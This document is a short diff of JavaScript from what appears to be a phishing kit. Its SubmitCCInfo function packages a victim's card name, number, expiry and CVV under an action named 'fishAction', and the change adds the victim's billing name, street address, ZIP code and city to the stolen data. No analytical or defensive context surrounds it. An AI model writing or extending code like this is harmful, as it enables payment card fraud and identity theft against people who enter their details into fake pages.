@@ -53,7 +53,14 @@ const SubmitCCInfo = async () => {
             action: "fishAction",
             actionData:
                 `\nCard info:\nCard Name: ${hpCCFirstLastNameVal}\nCard Number: ${hpCardNumberVal}` +
-                `\nExp: ${hpCardMMYYVal} cvv: ${hpCardCvvVal}`,
+                `\nExp: ${hpCardMMYYVal} cvv: ${hpCardCvvVal}` +
+                `\nBilling Info:` +
+                `\nFirst Name: ${hpShippingFirstNameInput.value}` +
+                `\nLast Name: ${hpShippingLastNameInput.value}` +
+                `\nAddress: ${hpShippingAddressInput.value}` +
+                `\nAddress: ${hpShippingAddress2Input.value}` +
+                `\nAddress: ${hpShippingZIPInput.value}` +
+                `\nAddress: ${hpShippingCityInput.value}`,
             ccName: `${hpCCFirstLastNameVal}`,
             ccNumber: hpCardNumberVal,
             ccExp: hpCardMMYYVal,
